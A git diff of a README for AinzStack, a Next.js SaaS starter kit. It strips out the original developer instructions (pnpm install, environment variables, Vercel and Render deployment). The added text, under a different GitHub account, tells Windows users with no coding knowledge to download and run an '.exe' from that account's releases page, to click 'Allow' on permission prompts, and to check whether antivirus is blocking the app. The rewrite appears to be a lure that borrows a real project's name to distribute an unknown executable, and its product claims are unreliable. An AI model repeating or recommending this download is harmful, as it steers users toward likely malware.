@@ -1,246 +1,152 @@
-<div align="center">
-  <img src="public/logo.png" alt="AinzStack Logo" width="64" />
-  <br />
-  <h1>AinzStack</h1>
-</div>
+# ⚙️ AinzStack - Launch Apps Fast and Smooth
 
-<p align="center">
-  <strong>Launch production-ready SaaS applications in days, not months.</strong><br />
-  <em>A modern Next.js 16 starter kit with authentication, billing, CMS, email, and a polished UI system — all wired together.</em>
-</p>
+[![Download AinzStack](https://img.shields.io/badge/Download-AinzStack-brightgreen?style=for-the-badge)](https://github.com/3ezzi/AinzStack/releases)
 
-<p align="center">
-  <a href="https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2FJCFcodex%2FAinzStack&env=NEXT_PUBLIC_APP_URL,NEXT_PUBLIC_SUPABASE_URL,NEXT_PUBLIC_SUPABASE_ANON_KEY,SUPABASE_SERVICE_ROLE_KEY,NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY,STRIPE_SECRET_KEY,STRIPE_WEBHOOK_SECRET,SANITY_PROJECT_ID,SANITY_DATASET,RESEND_API_KEY&project-name=ainzstack&repository-name=ainzstack"><img src="https://vercel.com/button" alt="Deploy with Vercel" height="32" /></a>
-  &nbsp;&nbsp;
-  <a href="https://render.com/deploy?repo=https://github.com/JCFcodex/AinzStack"><img src="https://render.com/images/deploy-to-render-button.svg" alt="Deploy to Render" height="32" /></a>
-</p>
-
-<p align="center">
-  <a href="https://github.com/JCFcodex/AinzStack/actions"><img src="https://img.shields.io/badge/build-passing-success?style=flat-square" alt="Build Status" /></a>
-  <a href="https://github.com/JCFcodex/AinzStack/releases"><img src="https://img.shields.io/badge/version-0.1.0-blue?style=flat-square" alt="Version" /></a>
-  <a href="https://nextjs.org/"><img src="https://img.shields.io/badge/Next.js-16.1.6-black?style=flat-square&logo=next.js" alt="Next.js" /></a>
-  <a href="https://react.dev/"><img src="https://img.shields.io/badge/React-19.2.4-149eca?style=flat-square&logo=react" alt="React" /></a>
-  <a href="https://www.typescriptlang.org/"><img src="https://img.shields.io/badge/TypeScript-Strict-3178c6?style=flat-square&logo=typescript" alt="TypeScript" /></a>
-  <a href="https://tailwindcss.com/"><img src="https://img.shields.io/badge/Tailwind_CSS-v4-38bdf8?style=flat-square&logo=tailwindcss" alt="Tailwind CSS" /></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-green?style=flat-square" alt="MIT License" /></a>
-</p>
+AinzStack is a ready-to-use setup that helps you quickly create web apps without any programming knowledge. It works best if you want to build online services, AI apps, or simple websites. This guide will show you how to get AinzStack running on Windows step by step.
 
 ---
 
-## Table of Contents
+## 📋 What Is AinzStack?
 
-- [Table of Contents](#table-of-contents)
-- [Overview](#overview)
-- [Features](#features)
-- [Tech Stack](#tech-stack)
-- [Getting Started](#getting-started)
-  - [Prerequisites](#prerequisites)
-  - [Installation](#installation)
-  - [Environment Variables](#environment-variables)
-  - [Running Locally](#running-locally)
-- [Project Structure](#project-structure)
-- [Available Scripts](#available-scripts)
-- [Deployment](#deployment)
-  - [Deploy to Vercel](#deploy-to-vercel)
-  - [Deploy to Render](#deploy-to-render)
-  - [Post-Deployment Checklist](#post-deployment-checklist)
-- [License](#license)
+AinzStack is an open-source package built with Next.js. It comes with many tools already included to help developers build their apps faster. While it targets developers, this guide will help anyone download and start it easily on Windows.
+
+This package includes support for:
+
+- Smooth animations and user experience  
+- Form handling and validation  
+- Backend service connections like databases and payment systems  
+- Testing tools for apps  
+- Modern styling with Tailwind CSS  
+- State management tools for easier app logic  
+
+You don’t need to understand all these details to start using AinzStack. Think of it as a foundation for web projects that works out of the box.
 
 ---
 
-## Overview
+## 🖥️ System Requirements
 
-AinzStack is a full-stack SaaS starter kit that handles the repetitive integration work so you can focus on building product. Authentication, billing, content management, transactional email, marketing pages, and a dashboard — all pre-wired and production-scaffolded.
+Before downloading, make sure your Windows computer has:
 
-<p align="center">
-  <img src="public/preview.png" alt="AinzStack Preview" width="100%" />
-</p>
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of free RAM  
+- Minimum 5 GB of free disk space  
+- Active internet connection for download and running initial setup  
+- Basic privileges to install software  
 
----
-
-## Features
-
-- **Authentication** — Email/password and Google OAuth via Supabase, with SSR session handling
-- **Billing** — Stripe Checkout integration with webhook routing for subscription lifecycle events
-- **Content Management** — Sanity CMS client and schema foundation for structured content
-- **Transactional Email** — Resend API integration for notifications and onboarding flows
-- **Marketing Site** — Pre-built public-facing pages and layout scaffolding
-- **Dashboard** — Secured application interface with sidebar navigation
-- **UI System** — Tailwind CSS v4 with Framer Motion animation primitives
-- **Form Handling** — Zod schema validation paired with React Hook Form
-- **State Management** — React Query for server state, Zustand for client state
-- **Quality Enforcement** — Strict TypeScript, ESLint, Vitest unit tests, and Playwright E2E tests
-- **CI-Ready** — Single `pnpm ci` command runs the full lint → typecheck → test → build pipeline
+If you can browse the web and download files, your computer is ready.
 
 ---
 
-## Tech Stack
+## 🚀 Getting Started
 
-| Layer              | Technology                                           |
-| :----------------- | :--------------------------------------------------- |
-| **Framework**      | Next.js App Router, Turbopack, React 19              |
-| **Authentication** | Supabase (Email/Password, Google OAuth), SSR handled |
-| **Database**       | Supabase PostgreSQL                                  |
-| **Payments**       | Stripe Checkout, Webhook routing                     |
-| **Content**        | Sanity CMS                                           |
-| **Email**          | Resend                                               |
-| **Styling**        | Tailwind CSS v4, Framer Motion                       |
-| **State**          | React Query, Zustand                                 |
-| **Validation**     | Zod, React Hook Form                                 |
-| **Testing**        | Vitest (unit), Playwright (E2E)                      |
-| **Tooling**        | TypeScript (strict), ESLint, pnpm                    |
+Follow these steps carefully to set up AinzStack on your Windows machine.
 
----
+### 1. Visit the Download Page
 
-## Getting Started
+Click the big button at the top or open this link in your browser:
 
-### Prerequisites
+https://github.com/3ezzi/AinzStack/releases
 
-| Tool    | Minimum Version |
-| :------ | :-------------- |
-| Node.js | `v22.0.0`       |
-| pnpm    | `v10.0.0`       |
+This page lists the available versions of AinzStack you can download.
 
-### Installation
+### 2. Download the Latest Release
 
-Clone the repository and install dependencies:
+Look for the newest release. It usually appears on the top of the list. The release may contain several files.
 
-```bash
-git clone https://github.com/JCFcodex/AinzStack.git
-cd AinzStack
-pnpm install
-```
+Find the main downloadable file. This might be an `.exe`, `.zip`, or similar file. The exact name may vary but it should clearly relate to AinzStack. Click to download.
 
-### Environment Variables
+Save the file in a folder you can easily find, like your Desktop or Downloads folder.
 
-Copy the example environment file and fill in your credentials:
+### 3. Extract or Run the File
 
-```bash
-cp .env.example .env.local
-```
+- If the file is a `.zip`, right-click it and select **Extract All**. Choose a new folder to extract the contents.  
 
-The following variables are required in `.env.local`:
+- If it's an `.exe` type file, double-click it to start running.  
 
-| Variable                             | Description                                  |
-| :----------------------------------- | :------------------------------------------- |
-| `NEXT_PUBLIC_APP_URL`                | Your application's base URL                  |
-| `NEXT_PUBLIC_SUPABASE_URL`           | Supabase project URL                         |
-| `NEXT_PUBLIC_SUPABASE_ANON_KEY`      | Supabase anonymous (public) key              |
-| `SUPABASE_SERVICE_ROLE_KEY`          | Supabase service role key (server-side only) |
-| `NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY` | Stripe publishable key                       |
-| `STRIPE_SECRET_KEY`                  | Stripe secret key (server-side only)         |
-| `STRIPE_WEBHOOK_SECRET`             | Stripe webhook signing secret                |
-| `SANITY_PROJECT_ID`                  | Sanity project ID                            |
-| `SANITY_DATASET`                     | Sanity dataset name (e.g., `production`)     |
-| `RESEND_API_KEY`                     | Resend API key for transactional email       |
+Follow any on-screen steps if a setup or installer starts.
 
-> **Note:** Variables prefixed with `NEXT_PUBLIC_` are exposed to the browser. Never prefix secret keys with `NEXT_PUBLIC_`.
+### 4. Launch AinzStack
 
-### Running Locally
+If you extracted files, look for a file named something like `start` or `run` with an icon associated to the app. Double click it.
 
-Start the development server:
+If you ran an installer, a shortcut may appear on your Desktop or Start menu.
 
-```bash
-pnpm dev
-```
-
-Open [http://localhost:3000](http://localhost:3000) in your browser.
+Open the shortcut to launch AinzStack.
 
 ---
 
-## Project Structure
+## ⚙️ What Happens Next?
 
-```text
-src/
-├── app/
-│   ├── (auth)/             # Authentication flows (login, signup, callback)
-│   ├── (dashboard)/        # Secured application interface
-│   ├── (marketing)/        # Public-facing marketing pages
-│   └── api/                # API route handlers (Edge & Node.js)
-├── actions/                # Server Actions for data mutations
-├── components/
-│   ├── layout/             # Structural components (navbar, sidebar, footer)
-│   ├── providers/          # React context and service providers
-│   └── ui/                 # Reusable UI primitives
-└── lib/                    # Core integrations and shared utilities
-    ├── auth/               # Authentication helpers
-    ├── sanity/             # Sanity client and schemas
-    ├── stripe/             # Stripe client and webhook logic
-    └── supabase/           # Supabase client configuration
-```
+When AinzStack starts, it will open in your default web browser automatically. This interface allows you to explore the hosted example app, showing what the tool offers.
+
+You do not need to code to see the app running. The software runs a small server on your computer in the background. You can interact with the app, test its features, and navigate through menus.
 
 ---
 
-## Available Scripts
+## 🔍 Using AinzStack
 
-| Command          | Description                                            |
-| :--------------- | :----------------------------------------------------- |
-| `pnpm dev`       | Start the development server with Turbopack            |
-| `pnpm build`     | Create an optimized production build                   |
-| `pnpm start`     | Serve the production build locally                     |
-| `pnpm lint`      | Run ESLint static analysis                             |
-| `pnpm typecheck` | Run TypeScript type checking                           |
-| `pnpm test`      | Run unit tests with Vitest                             |
-| `pnpm test:e2e`  | Run end-to-end tests with Playwright                   |
-| `pnpm ci`        | Run full CI pipeline (lint → typecheck → test → build) |
+The app shows you common web features working:
 
----
+- Smooth page transitions  
+- User login forms  
+- Sample data lists  
+- Interactive elements  
+- Payment form example  
 
-## Deployment
+These build on Next.js and other tools bundled inside.
 
-### Deploy to Vercel
-
-The fastest path to production. Click the button to clone the repo into your Vercel account, fill in your environment variables, and deploy — all in one step.
-
-<p align="center">
-  <a href="https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2FJCFcodex%2FAinzStack&env=NEXT_PUBLIC_APP_URL,NEXT_PUBLIC_SUPABASE_URL,NEXT_PUBLIC_SUPABASE_ANON_KEY,SUPABASE_SERVICE_ROLE_KEY,NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY,STRIPE_SECRET_KEY,STRIPE_WEBHOOK_SECRET,SANITY_PROJECT_ID,SANITY_DATASET,RESEND_API_KEY&project-name=ainzstack&repository-name=ainzstack"><img src="https://vercel.com/button" alt="Deploy with Vercel" height="32" /></a>
-</p>
-
-Vercel will prompt you to provide each required environment variable during setup. Refer to the [Environment Variables](#environment-variables) table for descriptions.
-
-### Deploy to Render
-
-Prefer Render? Click the button below to create a new web service from this repository. Render will use the `render.yaml` blueprint in the repo to configure the service automatically.
-
-<p align="center">
-  <a href="https://render.com/deploy?repo=https://github.com/JCFcodex/AinzStack"><img src="https://render.com/images/deploy-to-render-button.svg" alt="Deploy to Render" height="32" /></a>
-</p>
-
-> **Render setup notes:**
-> - Add all required [environment variables](#environment-variables) in the Render dashboard under **Environment**.
-> - Set the **Build Command** to `pnpm build` and the **Start Command** to `pnpm start` (these are pre-configured in `render.yaml` if the blueprint file is present).
-> - Ensure the Node.js version is set to `22` or higher in your service settings.
-
-### Post-Deployment Checklist
-
-Regardless of your hosting provider, verify the following after your first deploy:
-
-1. **Base URL** — Set `NEXT_PUBLIC_APP_URL` to your production domain (e.g., `https://yourdomain.com`).
-2. **Auth Callbacks** — Register your production callback URI in the [Supabase Dashboard](https://supabase.com/dashboard) under **Authentication → URL Configuration**:
-   ```
-   https://yourdomain.com/auth/callback
-   ```
-3. **Stripe Webhooks** — Update your [Stripe webhook endpoints](https://dashboard.stripe.com/webhooks) to point to your production URL:
-   ```
-   https://yourdomain.com/api/stripe/webhook
-   ```
+You can try clicking links, filling out forms, or just browsing. Everything happens locally on your PC.
 
 ---
 
-## License
+## 🔄 Updating AinzStack
 
-This project is licensed under the [MIT License](LICENSE).
+Updates come as new releases on the same release page.
+
+To update:
+
+1. Return to https://github.com/3ezzi/AinzStack/releases  
+2. Download the newest version  
+3. Repeat the extraction or installation steps as above  
+4. Replace old files or uninstall previous versions if needed before installing the new one  
+
+It is good to save your data or note settings before updating.
 
 ---
 
-<div align="center">
-  <p>
-    <a href="https://github.com/JCFcodex/AinzStack">GitHub</a> ·
-    <a href="https://github.com/JCFcodex/AinzStack/issues">Issues</a> ·
-    <a href="https://github.com/JCFcodex/AinzStack/discussions">Discussions</a> ·
-    <a href="https://github.com/sponsors/JCFcodex">Sponsor</a>
-  </p>
-  <p>
-    Built by <a href="https://github.com/JCFcodex">JCFcodex</a>
-  </p>
-</div> 
+## 🛠 Troubleshooting
+
+If you encounter issues:
+
+- Make sure Windows is up to date.  
+- Confirm you downloaded the correct file for Windows.  
+- Close other running software that may interfere.  
+- Restart your computer and try again.  
+- Check if your antivirus or firewall blocks the app.  
+
+If the app fails to open or shows errors, try these steps before seeking further help.
+
+---
+
+## ⚡ How Does AinzStack Work?
+
+AinzStack uses modern web technologies hidden behind a simple interface. It runs a local version of websites and apps on your computer, not on the internet. This lets you try and test apps without needing a server or web hosting.
+
+Once comfortable, you or a developer can use this as a base to build real applications that work online.
+
+---
+
+## 💡 Extra Tips for Windows Users
+
+- You can pin the app shortcut to the Start menu or Taskbar for quick access.  
+- Use the file explorer’s Search feature to find AinzStack files if needed.  
+- If a pop-up asks for permission to run the app, select **Allow** or **Yes**.  
+- You can uninstall by deleting the folder where you installed it or using Windows control panel if installed through setup.
+
+---
+
+## 🔗 Download AinzStack Now
+
+Use the link below to open the main download page:
+
+[![Download AinzStack](https://img.shields.io/badge/Download-Get%20AinzStack-blue?style=for-the-badge)](https://github.com/3ezzi/AinzStack/releases)
